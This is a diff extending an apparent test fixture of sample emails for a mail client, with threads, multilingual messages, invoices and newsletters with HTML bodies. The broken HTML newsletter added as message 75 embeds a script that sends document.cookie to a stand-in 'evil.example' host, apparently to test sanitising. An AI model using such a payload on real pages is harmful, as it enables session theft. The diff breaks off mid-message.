@@ -9,7 +9,8 @@
     "body": "Hey,\n\nI went back through the telemetry from the last two weeks and I think the three-state model is right, but only if Waiting means \"blocked on someone\" and not \"I'll get to it\". Right now people dump newsletters into Waiting and the queue becomes meaningless.\n\nProposal:\n  - Inbox = needs a decision from me\n  - Waiting = I'm waiting on a person or a date\n  - Later = parked until something changes\n  - Done = closed, never see it again\n\nThat gives us four lists that are each honest about what they mean. If we ship only three I'll push back, because Done and Later are the two people actually ask about.\n\nCan you look at the keyboard map before Thursday? I left comments inline.\n\n— Dana",
     "received": "2026-09-29T07:41:00Z",
     "state": "Inbox",
-    "account": "personal"
+    "account": "personal",
+    "cc": "Priya Raman <priya@northwind.io>"
   },
   {
     "id": 2,
@@ -21,7 +22,8 @@
     "body": "Following up on my own message, which is a bad habit I know.\n\nThe thing I keep coming back to: the list is the interface. If the list is wrong the app is wrong, no matter how fast the rendering is. So let's spend the extra week on getting the state model honest.\n\nAlso, small thing — when I hit shift-J I expect the range to be inclusive of where I started. Otherwise I have to hold one extra keystroke in my head and that's exactly the kind of friction we're trying to delete.\n\nThursday works.\n\n— Dana",
     "received": "2026-09-28T18:05:00Z",
     "state": "Inbox",
-    "account": "personal"
+    "account": "personal",
+    "cc": "Priya Raman <priya@northwind.io>, Ines Duarte <ines@whitfield.dev>"
   },
   {
     "id": 3,
@@ -33,7 +35,18 @@
     "body": "Hi,\n\nNotes from the design review are below. Everything in the \"needs a decision\" bucket is on you, everything else is on me.\n\n1. The row height is 28px and the sender column truncates at 220px. Dana asked for more room for the subject; I think 260px is the compromise.\n2. Key hints are shown inline at the bottom of the list, always, not only on hover. Nobody discovers hover.\n3. The accent color is used for exactly one thing: the cursor. Not for links, not for the unread dot. One accent, one meaning.\n\nI also want to kill the rounded corners. Two pixels maximum. This is a mail client for people who triage, not a wellness app.\n\n— Priya",
     "received": "2026-09-26T15:22:00Z",
     "state": "Archived",
-    "account": "personal"
+    "account": "personal",
+    "cc": "Dana Whitfield <dana@whitfield.dev>",
+    "attachments": [
+      {
+        "name": "design-review-0926.pdf",
+        "size": 318412
+      },
+      {
+        "name": "row-height-spec.png",
+        "size": 96120
+      }
+    ]
   },
   {
     "id": 4,
@@ -155,7 +168,18 @@
     "body": "Thanks for flying with us.\n\n  Booking NW4471\n  Outbound  Thu 8 Oct 07:40 → Lisbon LIS 16:05\n  Return    Sun 11 Oct 19:30 → Stansted STN 22:15\n  Seats     14A, 14B (aisle + window)\n\nTotal charged 412.60 EUR. This receipt covers both passengers; the second ticket is itemised on the attached statement.\n\nBaggage: 1 checked bag per passenger included. Additional bags are charged at the gate.\n\nManage your booking: https://flyna.com/manage/NW4471",
     "received": "2026-09-27T12:30:00Z",
     "state": "Inbox",
-    "account": "personal"
+    "account": "personal",
+    "attachments": [
+      {
+        "name": "receipt-NW4471.pdf",
+        "size": 84211
+      },
+      {
+        "name": "statement-passenger-2.pdf",
+        "size": 61007
+      }
+    ],
+    "html": "<html><body><h2>Your receipt</h2><p>Thanks for flying with us. Booking <strong>NW4471</strong>, two passengers.</p><table border=\"1\" cellpadding=\"6\" cellspacing=\"0\"><thead><tr><th>Item</th><th>Detail</th><th>Qty</th><th>Amount</th></tr></thead><tbody><tr><td>Outbound</td><td>Thu 8 Oct 07:40 STN &rarr; LIS 16:05</td><td>2</td><td>EUR 173.00</td></tr><tr><td>Return</td><td>Sun 11 Oct 19:30 LIS &rarr; STN 22:15</td><td>2</td><td>EUR 159.80</td></tr><tr><td>Seats</td><td>14A window, 14B aisle</td><td>2</td><td>EUR 24.00</td></tr><tr><td>Taxes and fees</td><td>Airport charges, security</td><td>1</td><td>EUR 55.80</td></tr></tbody><tfoot><tr><th colspan=\"3\" align=\"left\">Total charged</th><th>EUR 412.60</th></tr></tfoot></table><p>Baggage: 1 checked bag per passenger included. Additional bags are charged at the gate.</p><p><a href=\"https://flyna.com/manage/NW4471\">Manage your booking</a></p></body></html>"
   },
   {
     "id": 14,
@@ -287,7 +311,8 @@
     "body": "Databases\n  A long-running experiment comparing B-tree, LSM and skip-list indexes over five years of a production table. The winner changes depending on write shape, which is either a useful result or an excuse to keep benchmarking.\n\nTooling\n  A CLI framework that generates completions and man pages from annotations. The interesting part is that it also generates a TUI.\n\nLong read\n  Someone actually read RFC 9110 and summarised the parts that affect everyday HTTP debugging. It is much better than it sounds.\n\nhttps://tldr.tech/databases/indexes",
     "received": "2026-09-26T06:00:00Z",
     "state": "Inbox",
-    "account": "personal"
+    "account": "personal",
+    "html": "<html><body><h1>TLDR</h1><h2>Databases</h2><p>A long-running experiment comparing B-tree, LSM and skip-list indexes over five years of a production table. The winner changes depending on write shape, which is either a useful result or an excuse to keep benchmarking.</p><h2>Tooling</h2><p>A CLI framework that generates completions and man pages from annotations. The interesting part is that it also generates a <em>TUI</em>.</p><h2>Long read</h2><p>Someone actually read RFC 9110 and summarised the parts that affect everyday HTTP debugging. It is much better than it sounds.</p><p><a href=\"https://tldr.tech/databases/indexes\">Read on tldr.tech</a></p></body></html>"
   },
   {
     "id": 25,
@@ -359,7 +384,13 @@
     "body": "I'm on NW4471 too, 14B, so we'll be in the same row unless one of us upgrades and gets dumped in the middle.\n\nComplaint: your idea of a four-day week in August made the rest of us look bad, and I want it on the record that I worked through the August bank holiday and said nothing.\n\nSee you Thursday. Bring the good keyboard, I'm bringing the bad one on purpose.\n\n— Tom",
     "received": "2026-09-28T21:15:00Z",
     "state": "Inbox",
-    "account": "personal"
+    "account": "personal",
+    "attachments": [
+      {
+        "name": "NW4471-itinerary.pdf",
+        "size": 45908
+      }
+    ]
   },
   {
     "id": 31,
@@ -491,7 +522,25 @@
     "body": "Four proofs attached, 18x24cm, on the warm white stock we talked about.\n\nMy vote: the second one. The blacks hold and the grain survives the enlargement. The first is prettier at thumbnail size and falls apart at print size, which tells you everything.\n\nIf you agree I'll order 50 of the second and we can have them for the party.\n\n— Marta",
     "received": "2026-09-15T15:20:00Z",
     "state": "Inbox",
-    "account": "personal"
+    "account": "personal",
+    "attachments": [
+      {
+        "name": "proof-1.jpg",
+        "size": 2412880
+      },
+      {
+        "name": "proof-2.jpg",
+        "size": 2598144
+      },
+      {
+        "name": "proof-3.jpg",
+        "size": 2377601
+      },
+      {
+        "name": "proof-4.jpg",
+        "size": 2460320
+      }
+    ]
   },
   {
     "id": 42,
@@ -647,7 +696,8 @@
     "body": "Plan for Monday is one merge and nothing else.\n\n  • PR #41 (cursor + anchor) lands first, behind a flag\n  • Then the keymap table and the help overlay, which is mostly text\n  • Nothing new after that, no matter what shows up in the tracker\n\nIf something breaks on Sunday night I would rather find out Monday morning than have a half-finished branch sitting on main.\n\n— Dana",
     "received": "2026-09-27T07:30:00Z",
     "state": "Inbox",
-    "account": "personal"
+    "account": "personal",
+    "cc": "Priya Raman <priya@northwind.io>"
   },
   {
     "id": 55,
@@ -720,5 +770,344 @@
     "received": "2026-09-08T13:26:00Z",
     "state": "Archived",
     "account": "personal"
+  },
+  {
+    "id": 61,
+    "thread_id": 1001,
+    "from_name": "Priya Raman",
+    "from_email": "priya@northwind.io",
+    "to": "You <you@example.com>, Cal Okonkwo <cal@northwind.io>",
+    "subject": "Q4 offsite — venue shortlist",
+    "body": "Hi all,\n\nThree venues made the shortlist for the Q4 offsite. Details are in the attached PDF; the budget draft is in the spreadsheet.\n\n1. Harbour Loft, Lisbon — 18 seats, own kitchen, 12 minutes from the airport\n2. The Old Dairy, Kent — 22 seats, quiet, no decent train\n3. Kvarteret, Bergen — 16 seats, most expensive, best room\n\nConstraints as I understand them:\n- two nights, Wed 4 Nov to Fri 6 Nov\n- nobody travels more than six hours\n- a room where we can put a whiteboard on every wall\n\nCan everyone reply with a ranking by Wednesday? Comments on the budget are welcome, but please keep them in the sheet so I don't have to collate email.\n\nVenue pages: https://harbourloft.example/offsite and https://theolddairy.example/stay\n\n— Priya",
+    "received": "2026-09-14T09:05:00Z",
+    "state": "Archived",
+    "account": "personal",
+    "cc": "Sam Behrends <sam@northwind.io>, Dana Whitfield <dana@whitfield.dev>",
+    "attachments": [
+      {
+        "name": "venue-shortlist.pdf",
+        "size": 1482113
+      },
+      {
+        "name": "budget-draft.xlsx",
+        "size": 48213
+      }
+    ]
+  },
+  {
+    "id": 62,
+    "thread_id": 1001,
+    "from_name": "Cal Okonkwo",
+    "from_email": "cal@northwind.io",
+    "to": "Priya Raman <priya@northwind.io>, You <you@example.com>",
+    "subject": "Re: Q4 offsite — venue shortlist",
+    "body": "Ranking: Bergen, Lisbon, Kent. Bergen is worth the money if we only do this once a year, and we do.\n\nOne flag: the Old Dairy has a 30-day cancellation window and the other two have 14. If we pick it we commit early.\n\n— Cal\n\nOn Mon, 14 Sep 2026 at 09:05, Priya Raman <priya@northwind.io> wrote:\n> Hi all,\n>\n> Three venues made the shortlist for the Q4 offsite. Details are in the\n> attached PDF; the budget draft is in the spreadsheet.\n>\n> 1. Harbour Loft, Lisbon — 18 seats, own kitchen, 12 minutes from the airport\n> 2. The Old Dairy, Kent — 22 seats, quiet, no decent train\n> 3. Kvarteret, Bergen — 16 seats, most expensive, best room\n>\n> Can everyone reply with a ranking by Wednesday? Comments on the budget are\n> welcome, but please keep them in the sheet.\n>\n> — Priya",
+    "received": "2026-09-14T11:40:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "cc": "Sam Behrends <sam@northwind.io>, Dana Whitfield <dana@whitfield.dev>"
+  },
+  {
+    "id": 63,
+    "thread_id": 1001,
+    "from_name": "Sam Behrends",
+    "from_email": "sam@northwind.io",
+    "to": "Priya Raman <priya@northwind.io>, Cal Okonkwo <cal@northwind.io>, You <you@example.com>",
+    "subject": "Re: Q4 offsite — venue shortlist",
+    "body": "Bergen quote attached. It is 14% over the draft, mostly the room hire.\n\nLisbon is my second choice. Harbour Loft will hold the dates until Friday at no charge.\n\n— Sam\n\nOn Mon, 14 Sep 2026 at 11:40, Cal Okonkwo <cal@northwind.io> wrote:\n> Ranking: Bergen, Lisbon, Kent. Bergen is worth the money if we only do this\n> once a year, and we do.\n>\n> One flag: the Old Dairy has a 30-day cancellation window and the other two\n> have 14. If we pick it we commit early.\n>\n> On Mon, 14 Sep 2026 at 09:05, Priya Raman <priya@northwind.io> wrote:\n>> Hi all,\n>>\n>> Three venues made the shortlist for the Q4 offsite.\n>>\n>> Can everyone reply with a ranking by Wednesday?\n>>\n>> — Priya",
+    "received": "2026-09-15T08:20:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "cc": "Dana Whitfield <dana@whitfield.dev>",
+    "attachments": [
+      {
+        "name": "bergen-quote.pdf",
+        "size": 212904
+      }
+    ]
+  },
+  {
+    "id": 64,
+    "thread_id": 1001,
+    "from_name": "Dana Whitfield",
+    "from_email": "dana@whitfield.dev",
+    "to": "Priya Raman <priya@northwind.io>, You <you@example.com>",
+    "subject": "Re: Q4 offsite — venue shortlist",
+    "body": "Adding Ines, who owns the travel policy. Ines: does a Bergen trip need sign-off from finance, or only anything over 500 EUR a head?\n\nMy ranking is Lisbon, Bergen, Kent. The Old Dairy is lovely and I would still pick it last, because nobody on the team can get there without a car.\n\n— Dana\n\n-----Original Message-----\nFrom: Sam Behrends <sam@northwind.io>\nSent: Tuesday, 15 September 2026 08:20\nTo: Priya Raman; Cal Okonkwo; you@example.com\nCc: Dana Whitfield\nSubject: Re: Q4 offsite — venue shortlist\n\nBergen quote attached. It is 14% over the draft, mostly the room hire.\n\nLisbon is my second choice. Harbour Loft will hold the dates until Friday at no charge.\n\n— Sam",
+    "received": "2026-09-16T10:05:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "cc": "Cal Okonkwo <cal@northwind.io>, Sam Behrends <sam@northwind.io>, Ines Duarte <ines@whitfield.dev>"
+  },
+  {
+    "id": 65,
+    "thread_id": 1001,
+    "from_name": "Priya Raman",
+    "from_email": "priya@northwind.io",
+    "to": "You <you@example.com>, Cal Okonkwo <cal@northwind.io>, Sam Behrends <sam@northwind.io>",
+    "subject": "Re: Q4 offsite — venue shortlist",
+    "body": "Decision: Lisbon. Three of four rankings put it first, and Ines confirms the trip needs no extra sign-off.\n\nThe deposit deadline is firm: Harbour Loft wants the contract signed by Friday 18 Sep, 17:00. I have attached nothing new; the contract is the PDF from Harbour Loft's page. Can one of you read the cancellation clause tonight?\n\nFlights are next. Please book nothing until I post the dates in the sheet.\n\n— Priya\n\nOn Wed, 16 Sep 2026 at 14:10, You <you@example.com> wrote:\n> Ranking: Lisbon, Bergen, Kent.\n>\n> Lisbon keeps everyone under the six-hour rule and the hold is free until\n> Friday. Bergen only wins if the budget moves, and I would rather not\n> reopen that.\n>\n> On Wed, 16 Sep 2026 at 10:05, Dana Whitfield <dana@whitfield.dev> wrote:\n>> Adding Ines, who owns the travel policy.\n>>\n>> My ranking is Lisbon, Bergen, Kent.",
+    "received": "2026-09-17T16:30:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "cc": "Dana Whitfield <dana@whitfield.dev>, Ines Duarte <ines@whitfield.dev>"
+  },
+  {
+    "id": 66,
+    "thread_id": 1001,
+    "from_name": "You",
+    "from_email": "you@example.com",
+    "to": "Priya Raman <priya@northwind.io>",
+    "subject": "Re: Q4 offsite — venue shortlist",
+    "body": "Ranking: Lisbon, Bergen, Kent.\n\nLisbon keeps everyone under the six-hour rule and the hold is free until Friday. Bergen only wins if the budget moves, and I would rather not reopen that.\n\nPriya, if we agree on Lisbon, can you confirm with Harbour Loft tomorrow?\n\nOn Wed, 16 Sep 2026 at 10:05, Dana Whitfield <dana@whitfield.dev> wrote:\n> Adding Ines, who owns the travel policy. Ines: does a Bergen trip need\n> sign-off from finance, or only anything over 500 EUR a head?\n>\n> My ranking is Lisbon, Bergen, Kent.",
+    "received": "2026-09-16T14:10:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "cc": "Cal Okonkwo <cal@northwind.io>, Sam Behrends <sam@northwind.io>, Dana Whitfield <dana@whitfield.dev>",
+    "bcc": "Sofia Marin <sofia@marin.studio>",
+    "outgoing": true
+  },
+  {
+    "id": 67,
+    "thread_id": 1002,
+    "from_name": "Mum",
+    "from_email": "mum@whitfield.home",
+    "to": "you@example.com",
+    "subject": "landed",
+    "body": "Landed. Dinner at 7, bring the good bread.\n\nx",
+    "received": "2026-09-26T19:30:00Z",
+    "state": "Inbox",
+    "account": "personal"
+  },
+  {
+    "id": 68,
+    "thread_id": 1003,
+    "from_name": "Tomas Lindqvist",
+    "from_email": "tomas@lindqvist.example",
+    "to": "you@example.com",
+    "subject": "the long version of my talk (you asked for it)",
+    "body": "You asked for the long version, so this is it. Get a coffee.\n\n1. Where it started\n\nTwo years ago I counted how I spent a working day in my inbox. Not the time reading, the time deciding. Every message forced the same four decisions before I had read a word: is it for me, does it need an answer, does it have a date, can it wait. The mail client answered none of them. It showed me a list and a bold font and left the rest to my attention, which is the one resource I cannot refill at lunch.\n\nSo the first prototype did nothing clever. It put the four decisions on the keyboard: reply, archive, snooze, delete. One key each, no menus, the cursor always on a message. The day I stopped reaching for the mouse was the day my inbox count started going down instead of sideways.\n\n2. What the model needs to be honest\n\nThe main lesson of the last year is that a mail client is a state machine pretending to be a list. Every message is in exactly one place: the inbox, snoozed until a date, archived, filed in a folder, or deleted. Everything else is a label on top of that, never a second state. The moment a message can be in two places at once, nobody trusts any count on the screen.\n\nI want to be precise about what this buys you:\n\n  - counts always add up, and a test enforces it on every keystroke sequence I could think of\n  - undo is one inverse operation per action, which makes it cheap to keep forever\n  - a thread has no state of its own; it is the newest unarchived message that decides where it shows up\n  - nothing is ever hidden without a way to ask where it went\n\nThe last point matters more than it sounds. Muting a thread is fine as long as search still finds it and the count of hidden messages is written in the footer. Silence is a feature; invisibility is a bug.\n\n3. The AI part, and why it only suggests\n\nI spent three months on automatic labels before I accepted the obvious. A classifier that is right 92 percent of the time is wrong on about one message in twelve, and the twelfth is the one from your landlord. So every label the model proposes either is applied with a visible, undoable mark, or waits in a review strip until you press y or n. The confidence threshold is a setting, per question, and the default for anything that moves mail between states is: never. Labels are cheap to be wrong about. Moves are not.\n\nWhat worked better than a bigger model was a better question. Is this a person writing to me? Does it expect a reply? Is it a receipt? Five narrow questions beat one broad one, and each of them can be tested against a fixture of thirty real messages that I keep in the repository.\n\n4. Reading is not triage\n\nThe second surprise was the reader. I had assumed the reading pane was the boring part. It turned out to be where most of the design mistakes hide. Email is text and HTML and both at once, often in the same message, and the client has to choose one without making the user feel the choice. My rule now: render what the sender sent, structurally, with images blocked until asked, and give the reader one key to flip to plain text for anything that shouts. Quoted history folds away by default, because the only person who needs to see the same paragraph six times is a lawyer.\n\nI would like to try a version where the thread is a column of sibling messages instead of a stack, each with its own header, so you can tell who said what without counting indentation. That is the next experiment.\n\n5. What I would do differently\n\n  a. Write the fixture first. Half of my bugs were messages I had never seen: an empty subject, a fourteen-column table, a thread where every reply quotes every earlier reply.\n  b. Make the clock injectable on day one. Snooze, follow-up timers and the outbox all depend on time, and real time is impossible to test.\n  c. Keep the keyboard map in one file. I had two for a month and they disagreed about a single letter.\n  d. Resist the forty-first setting.\n\n6. Reading list\n\nEverything here is free and worth an afternoon:\n\n  - https://example.org/notes/state-machines-for-mail\n  - https://example.org/notes/the-cost-of-deciding\n  - https://example.org/notes/undo-as-inverse-operations\n\nIf you only read one, read the first. If you only reply to one thing in this email, reply to this: would you be willing to run the triage branch for a week with your real mailbox and tell me where it lies to you?\n\nThanks for listening to a talk that was supposed to be twenty minutes long.\n\n— Tomas\n\nP.S. The slides are dull without me. The notes above are the real talk.",
+    "received": "2026-09-23T07:45:00Z",
+    "state": "Inbox",
+    "account": "personal"
+  },
+  {
+    "id": 69,
+    "thread_id": 1004,
+    "from_name": "Cal Okonkwo",
+    "from_email": "cal@northwind.io",
+    "to": "You <you@example.com>, Priya Raman <priya@northwind.io>",
+    "subject": "Re: Re: Fwd: [EXTERNAL] Updated agenda, revised budget, and the three open questions from last Thursday's steering committee meeting that we still need to resolve before the end of the quarter planning freeze",
+    "body": "Forwarding because the subject line at least has the virtue of being complete.\n\nThe three open questions, for the record:\n\n1. Does the Northwind integration ship in Q4, or is it a Q1 commitment with a Q4 preview?\n2. Who owns the on-call rota for the preview?\n3. Is the budget for the offsite inside or outside the planning freeze?\n\nCan we get answers by Friday? I would rather not discuss this in the room.\n\n— Cal",
+    "received": "2026-09-21T16:20:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "cc": "Sam Behrends <sam@northwind.io>"
+  },
+  {
+    "id": 70,
+    "thread_id": 1005,
+    "from_name": "田中 美咲",
+    "from_email": "misaki@tanaka-design.example",
+    "to": "you@example.com",
+    "subject": "来週のデザインレビューについて / 关于下周的设计评审",
+    "body": "お世話になっております。田中です。\n\n来週のデザインレビューの件でご連絡します。日程は10月6日(火)の午後3時(日本時間)でいかがでしょうか？ 画面の設計資料は事前に共有しますので、ご確認をお願いいたします。\n\n議題:\n  ・一覧画面の行の高さと余白\n  ・キーボードショートカットの一覧\n  ・ダークテーマの配色（コントラスト比）\n\n你好，补充一句中文：我们也希望在评审中讨论中日韩文字的排版，例如行高、字距以及混排英文时的基线对齐。한국어 사용자를 위한 줄바꿈 규칙도 확인하고 싶습니다.\n\nCan you confirm the time works for you? Tokyo is UTC+9, so 15:00 there is 06:00 UTC.\n\nよろしくお願いいたします。\n田中 美咲",
+    "received": "2026-09-24T02:15:00Z",
+    "state": "Inbox",
+    "account": "personal"
+  },
+  {
+    "id": 71,
+    "thread_id": 1006,
+    "from_name": "ليلى الحسن",
+    "from_email": "layla@alhasan.example",
+    "to": "you@example.com",
+    "subject": "مراجعة الترجمة العربية للواجهة — Arabic UI review",
+    "body": "مرحباً،\n\nأرسلت لك ملاحظات المراجعة على النسخة العربية من الواجهة. أهم النقاط:\n\n١. يجب أن يكون اتجاه النص من اليمين إلى اليسار في قائمة الرسائل، مع بقاء الأرقام والعناوين الإنجليزية سليمة.\n٢. اختصارات لوحة المفاتيح تبقى بالأحرف اللاتينية (e للأرشفة، d للحذف، s للتأجيل).\n٣. عنوان الرسالة طويل أحياناً، ويجب أن يلتف إلى سطر جديد بدلاً من أن يُقطع.\n\nهل يمكنك تأكيد موعد المراجعة يوم الخميس؟\n\nושורה אחת בעברית, לבדיקת כיוון מעורב: הכפתור \"ארכיון\" צריך להופיע בצד ימין של השורה, ליד התאריך 29.09.2026.\n\nسطر مختلط: the ticket is https://tracker.example/ui/4471 and the build is 0.9.2-rc1 (نسخة تجريبية).\n\nشكراً جزيلاً،\nليلى",
+    "received": "2026-09-23T19:10:00Z",
+    "state": "Inbox",
+    "account": "personal"
+  },
+  {
+    "id": 72,
+    "thread_id": 1007,
+    "from_name": "João Ferreira",
+    "from_email": "joao@ferreira-studio.example",
+    "to": "you@example.com",
+    "subject": "Exposição em Lisboa: orçamento, prazos e a lista de convidados",
+    "body": "Olá,\n\nSegue o ponto da situação da exposição. A montagem começa na terça-feira, 6 de outubro, e a inauguração é na quinta-feira às 18h30. A impressão das provas ficou mais cara do que o previsto, mas a qualidade compensa a diferença.\n\nLista de convidados (com os acentos certos, para não haver enganos no convite):\n  - Zoë Müller, Zürich\n  - Łukasz Wiśniewski, Kraków\n  - Jiří Dvořák, Brno\n  - Søren Kierkegård, København\n  - Åsa Öberg, Malmö\n  - Renée Dupré et François Lefèvre, Orléans\n  - José Ángel Núñez, Málaga\n\nUne dernière chose, en français : le café près de la gare est fermé le dimanche, donc prévoyons le déjeuner ailleurs. Und auf Deutsch: die Straße vor der Galerie wird am Donnerstag gesperrt, bitte plant mehr Zeit für die Anreise ein.\n\nPodes confirmar até sexta-feira se vens ao jantar de abertura?\n\nObrigado e um abraço,\nJoão",
+    "received": "2026-09-22T10:40:00Z",
+    "state": "Inbox",
+    "account": "personal"
+  },
+  {
+    "id": 73,
+    "thread_id": 1008,
+    "from_name": "Field Notes Weekly",
+    "from_email": "newsletter@fieldnotes-weekly.example",
+    "to": "you@example.com",
+    "subject": "Issue 212: The quiet interface",
+    "body": "",
+    "received": "2026-09-25T06:00:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "html": "<!doctype html><html><head><meta charset=\"utf-8\"><title>Field Notes Weekly — Issue 212</title><style>body{font-family:Georgia,serif;background:#f4efe6;color:#222}h1{color:#b3541e}.btn{background:#b3541e;color:#fff;padding:10px 18px;text-decoration:none}</style></head><body><div class=\"wrap\"><img src=\"https://cdn.fieldnotes-weekly.example/brand/logo@2x.png\" alt=\"Field Notes Weekly\" width=\"180\"><h1>Issue 212: The quiet interface</h1><p class=\"lede\">Seven links about software that gets out of your way. <a href=\"https://fieldnotes-weekly.example/issues/212\">Read it on the web</a>.</p><img src=\"https://cdn.fieldnotes-weekly.example/issues/212/hero.jpg\" alt=\"A worn keyboard on a workbench\" width=\"560\"><h2>This week</h2><ul><li><a href=\"https://fieldnotes-weekly.example/l/1\">The case for boring file formats</a> — why the plain text survives every migration.</li><li><a href=\"https://fieldnotes-weekly.example/l/2\">Undo is a data structure</a> — a short history of inverse operations.</li><li><a href=\"https://fieldnotes-weekly.example/l/3\">Keyboard maps as documentation</a> — one file, no drift.</li></ul><h2>One small tool</h2><p><strong>rgx</strong> is a regex tester that lives in the terminal. It is <em>fast</em>, it has no config, and it never asks you to sign in.</p><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAICAIAAABsw6g0AAAAL0lEQVR42mP48v4ZGWhziBwam4ESzcgkAyWaCRhEvGaiDCKVZKBEM4pBlBtBZYMAOiKt0Kk8q7IAAAAASUVORK5CYII=\" alt=\"Weekly reads, last twelve weeks\" width=\"96\" height=\"32\"><h2>From the archive</h2><ol><li><a href=\"https://fieldnotes-weekly.example/a/88\">Forms that respect the keyboard</a></li><li><a href=\"https://fieldnotes-weekly.example/a/131\">Why your list view is the product</a></li></ol><p><a class=\"btn\" href=\"https://fieldnotes-weekly.example/issues/212\">Read the full issue</a></p><img src=\"https://track.fieldnotes-weekly.example/open.gif?u=8841\" width=\"1\" height=\"1\" alt=\"\"><hr><p class=\"fine\">You are receiving this because you subscribed at fieldnotes-weekly.example. <a href=\"https://fieldnotes-weekly.example/unsubscribe\">Unsubscribe</a> · <a href=\"https://fieldnotes-weekly.example/preferences\">Preferences</a></p></div></body></html>"
+  },
+  {
+    "id": 74,
+    "thread_id": 1009,
+    "from_name": "Tunnel Tools",
+    "from_email": "billing@tunneltools.example",
+    "to": "you@example.com",
+    "subject": "Invoice INV-20917 from Tunnel Tools — September",
+    "body": "Invoice INV-20917 — September 2026\n\n  Tunnel Pro, 1 seat          EUR 29.00\n  Extra tunnel (x2)           EUR  5.00\n  VAT 0% (reverse charge)     EUR  0.00\n  ---------------------------------------\n  Total charged               EUR 34.00\n\nThe PDF invoice is attached. Paid by card ending 4417 on 24 Sep.\n\nView this invoice online: https://tunneltools.example/billing/INV-20917",
+    "received": "2026-09-24T08:12:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "html": "<html><body><h2>Invoice INV-20917</h2><p>September 2026 · paid by card ending 4417 on 24 Sep.</p><table border=\"1\" cellpadding=\"6\" cellspacing=\"0\"><thead><tr><th>Description</th><th>Qty</th><th>Unit</th><th>Amount</th></tr></thead><tbody><tr><td>Tunnel Pro</td><td>1</td><td>EUR 29.00</td><td>EUR 29.00</td></tr><tr><td>Extra tunnel</td><td>2</td><td>EUR 2.50</td><td>EUR 5.00</td></tr><tr><td>VAT 0% (reverse charge)</td><td>1</td><td>EUR 0.00</td><td>EUR 0.00</td></tr></tbody><tfoot><tr><th colspan=\"3\" align=\"left\">Total charged</th><th>EUR 34.00</th></tr></tfoot></table><p><a href=\"https://tunneltools.example/billing/INV-20917\">View this invoice online</a></p></body></html>",
+    "attachments": [
+      {
+        "name": "INV-20917.pdf",
+        "size": 58331
+      }
+    ]
+  },
+  {
+    "id": 75,
+    "thread_id": 1010,
+    "from_name": "Harbour Books Events",
+    "from_email": "newsletter@harbourbooks-events.example",
+    "to": "you@example.com",
+    "subject": "October events: readings, a print fair and one very long queue",
+    "body": "",
+    "received": "2026-09-20T12:00:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "html": "<html><head><title>October events<style>.x{color:red}<body bgcolor=\"#ffffee\"><script>document.location=\"https://evil.example/steal?c=\"+document.cookie;</script><div class=\"banner\"><h1>October at Harbour Books<p>Doors open at <b>18:30</b> unless stated otherwise, and <i>everything is free.<p>Thursday 8 Oct — Reading: <b>Ada Kowalska</b> <i>on translating silence</i></b><ul><li>Seats: 40<li>Wine from 18:00<li>Step-free entrance on the <a href=\"https://harbourbooks-events.example/map>side street</a><img src=\"https://cdn.harbourbooks-events.example/oct/poster.jpg\" alt=\"October poster\"><table><tr><td>Sat 17 Oct<td>Print fair, 10:00 to 16:00<tr><td>Fri 23 Oct<td>Late reading, doors 20:00</span></div></center><p>Tickets: <a href=\"https://harbourbooks-events.example/tickets\">reserve a seat"
+  },
+  {
+    "id": 76,
+    "thread_id": 1011,
+    "from_name": "Quiet Metrics",
+    "from_email": "digest@quietmetrics.example",
+    "to": "you@example.com",
+    "subject": "Your inbox, measured: five weeks in one table",
+    "body": "Five weeks of inbox counters. The table is wide on purpose; if it wraps in your client, that is a bug in your client.\n\nweek      inbox   archived  snoozed   filed   deleted   sent   received  needs_reply  priority  spam    median_reply_h  p90_reply_h\n2026-W35  412     1288      9         77      34        61     240       38           7       11      3.4             19.2\n2026-W36  398     1302      12        80      29        58     228       35           5       9       3.1             17.8\n2026-W37  371     1377      8         84      41        66     251       41           9       14      2.9             16.5\n2026-W38  344     1402      15        91      37        71     233       30           4       8       2.6             15.1\n2026-W39  327     1431      11        95      30        64     219       28           6       10      2.4             14.0\n\nFull dashboard: https://quietmetrics.example/dashboard",
+    "received": "2026-09-19T06:00:00Z",
+    "state": "Inbox",
+    "account": "personal",
+    "html": "<html><body><h1>Your inbox, measured</h1><p>Five weeks of inbox counters. The table is wide on purpose.</p><table border=\"1\" cellpadding=\"4\" cellspacing=\"0\" width=\"1400\"><thead><tr><th>week</th><th>inbox</th><th>archived</th><th>snoozed</th><th>filed</th><th>deleted</th><th>sent</th><th>received</th><th>needs_reply</th><th>priority</th><th>spam</th><th>median_reply_h</th><th>p90_reply_h</th></tr></thead><tbody><tr><td>2026-W35</td><td>412</td><td>1288</td><td>9</td><td>77</td><td>34</td><td>61</td><td>240</td><td>38</td><td>7</td><td>11</td><td>3.4</td><td>19.2</td></tr><tr><td>2026-W36</td><td>398</td><td>1302</td><td>12</td><td>80</td><td>29</td><td>58</td><td>228</td><td>35</td><td>5</td><td>9</td><td>3.1</td><td>17.8</td></tr><tr><td>2026-W37</td><td>371</td><td>1377</td><td>8</td><td>84</td><td>41</td><td>66</td><td>251</td><td>41</td><td>9</td><td>14</td><td>2.9</td><td>16.5</td></tr><tr><td>2026-W38</td><td>344</td><td>1402</td><td>15</td><td>91</td><td>37</td><td>71</td><td>233</td><td>30</td><td>4</td><td>8</td><td>2.6</td><td>15.1</td></tr><tr><td>2026-W39</td><td>327</td><td>1431</td><td>11</td><td>95</td><td>30</td><td>64</td><td>219</td><td>28</td><td>6</td><td>10</td><td>2.4</td><td>14.0</td></tr></tbody></table><p><a href=\"https://quietmetrics.example/dashboard\">Full dashboard</a></p></body></html>"
+  },
+  {
+    "id": 77,
+    "thread_id": 1012,
+    "from_name": "Nadia Farouk",
+    "from_email": "nadia@harbourbooks.example",
+    "to": "you@example.com",
+    "subject": "Saturday: reading list, tasks, and where to meet",
